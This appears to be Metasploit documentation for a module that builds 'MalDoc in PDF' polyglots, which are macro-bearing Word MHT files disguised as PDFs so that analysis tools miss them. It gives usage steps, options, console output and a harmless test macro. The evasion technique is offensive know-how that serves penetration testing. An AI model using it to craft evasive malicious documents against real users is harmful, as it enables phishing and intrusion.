## Vulnerable Application

The technique is called "MalDoc in PDF". This technique hides malicious Word documents in PDF files,
which is why malicious code contained in them cannot be detected by many analysis tools.

The document can be opened in both Microsoft Word and a PDF reader.

However, for the macro to run, you must open this document in Microsoft Word. The attack does not bypass
configured macro locks. The malicious macros are also not executed when the file is opened in PDF readers
or similar software.

### Introduction

A malicious MHT file created can be opened in Microsoft Word even though it has magic numbers and file
structure of PDF.

If the file has configured macro, by opening it in Microsoft Word, VBS runs and performs malicious behaviors.

## For Testing

You create a `Single File Web Page (*.mht, *.mhtml)` file containing a VBS macro. For testing, you can use the
following macro:

```
Sub AutoOpen()
   MsgBox "Macro executed successfully!", vbInformation, "Information"
End Sub
```

## Verification Steps

1. Start msfconsole
2. Do: `auxiliary/fileformat/maldoc_in_pdf_polyglot`
3. Do: `set FILENAME /tmp/macro.htm`
4. Do: `run`

## Options

### FILENAME

The input MHT filename with macro embedded.

### INJECTED_PDF

The input PDF filename to be injected. (optional)

### MESSAGE_PDF

The message to display in the local PDF template (if INJECTED_PDF is NOT used). Default: You must open this document in Microsoft Word

## Scenarios

### Create without PDF template

```
msf6 auxiliary(fileformat/maldoc_in_pdf_polyglot) > options 

Module options (auxiliary/fileformat/maldoc_in_pdf_polyglot):

   Name          Current Setting                                Required  Description
   ----          ---------------                                --------  -----------
   FILENAME      /tmp/macro.mht                                 yes       The input MHT filename with macro embedded
   INJECTED_PDF                                                 no        The input PDF filename to be injected (optional)
   MESSAGE_PDF   You must open this document in Microsoft Word  no        The message to display in the local PDF template (if INJECTED_PDF is NOT used)

View the full module info with the info, or info -d command.

msf6 auxiliary(fileformat/maldoc_in_pdf_polyglot) > run
[*] PDF creation using local template
[+] The file 'macro.doc' is stored at '/home/mekhalleh/.msf4/local/macro.doc'
[*] Auxiliary module execution completed
```

### Create using PDF template

```
msf6 auxiliary(fileformat/maldoc_in_pdf_polyglot) > options 

Module options (auxiliary/fileformat/maldoc_in_pdf_polyglot):

   Name          Current Setting                                Required  Description
   ----          ---------------                                --------  -----------
   FILENAME      /tmp/macro.mht                                 yes       The input MHT filename with macro embedded
   INJECTED_PDF  /tmp/injected.pdf                              no        The input PDF filename to be injected (optional)
   MESSAGE_PDF   You must open this document in Microsoft Word  no        The message to display in the local PDF template (if INJECTED_PDF is NOT used)


View the full module info with the info, or info -d command.

msf6 auxiliary(fileformat/maldoc_in_pdf_polyglot) > run
[*] PDF creation using 'injected.pdf' as template
[+] The file 'macro.doc' is stored at '/home/mekhalleh/.msf4/local/macro.doc'
[*] Auxiliary module execution completed
```

## References

1. <https://blogs.jpcert.or.jp/en/2023/08/maldocinpdf.html>
2. <https://socradar.io/maldoc-in-pdf-a-novel-method-to-distribute-malicious-macros/>
3. <https://www.nospamproxy.de/en/maldoc-in-pdf-danger-from-word-files-hidden-in-pdfs/>
4. <https://github.com/exa-offsec/maldoc_in_pdf_polyglot/tree/main/demo>
